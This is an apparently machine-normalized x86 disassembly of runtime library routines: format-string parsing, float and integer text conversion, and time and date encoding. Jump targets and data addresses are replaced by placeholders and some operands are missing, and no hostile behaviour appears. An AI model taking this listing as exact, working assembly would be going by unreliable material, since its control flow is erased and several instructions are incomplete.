jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_40aadc
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_40a868
mov esi eax
inc esi
mov eax esi
call sub_40aabc
mov ecx esi
mov edx ebx
call sub_40a8ac
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_40ab18
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40e528
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_40a8ac
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_40976c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_40aba0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_40aef7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_40ac82
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_40acca
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_40ac82
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40ab94
pop edx
or edx edx
je r-xdata
sub_40ac82
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_40aef7
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40acca
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_40aef7
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_40ab18
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_40acf1 ]
mov ebx ecx
sub cl 0x44
je sub_409d90
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_405758
jmp r-xdata
mov esi sub_4057d4
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_409d90
sub cl 0x44
je sub_409d24
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_409d24
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_409d90
mov ecx 0x10
cmp bl 0x58
je sub_409d24
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40ab70
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_40b0cc
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_409d24
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_40af18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40a868
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_40aba0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40af58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_40a868
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_40aba0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_40afac
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx 0x1000
mov edx [ ebp - 0x4 ]
mov eax edx
test eax eax
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax edx
test eax eax
je r-xdata
mov eax edx
test eax eax
je r-xdata
mov ebx eax
mov [ ebp - 0xc ] ebx
sub eax 0x4
mov eax [ eax ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x100c ]
mov edx 0xfff
call sub_40aba0
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x100c ]
mov eax edi
mov ecx [ ebp - 0xc ]
call sub_405620
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0xc ]
jle r-xdata
add ebx ebx
mov eax edi
call sub_405530
mov eax edi
mov edx ebx
call sub_405c6c
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405c6c
jmp r-xdata
push esi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ edi ]
call sub_40aba0
mov [ ebp - 0xc ] eax
sub esi 0x4
mov esi [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b088
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_40b0cc
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_40b3a0
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40b1cb
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_40b1d5
call sub_40b1cb
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40b088
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_40b231
call sub_40b1cb
call sub_40b1c2
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40b1c2
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_40b088
retn
xor ecx ecx
sub_40b26d
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40b1c2
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40b1c2
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40b2d2
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40b326
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_40b26d
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40b3a0
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_40b3cd
jmp r-xdata
call sub_40b4ef
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_40b3cd
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_40412c
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40b4ef
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_40b5cc
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40b683
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40b68e
neg edx
mov ecx esi
call sub_40b68e
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40b683
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40b6aa
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_40412c
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40b68e
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40b6aa
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40b6e0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_40b0cc
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_405620
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40b710
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_40b0cc
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_405620
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40b740
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4059dc
mov edx esp
xor ecx ecx
call sub_40b5cc
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_40976c
sub_40b798
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4059dc
mov edx esp
xor ecx ecx
call sub_40b5cc
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40b7c4
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4059dc
mov edx esp
xor ecx ecx
call sub_40b5cc
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40b80c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40b850
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40b8c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40b850
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_409754
sub_40b900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40b80c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_409738
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_409738
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_409738
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40b95c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40b998
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
movzx eax [ ebp - 0x2 ]
call sub_40b95c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
movzx eax [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_40ba64
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_40b998
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_409754
sub_40ba94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40b80c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_409738
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_409738
movzx eax [ ebp - 0x10 ]
add eax eax
add eax eax
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_409738
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40b95c
mov edx eax
movzx eax dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
movzx eax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
movzx ecx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
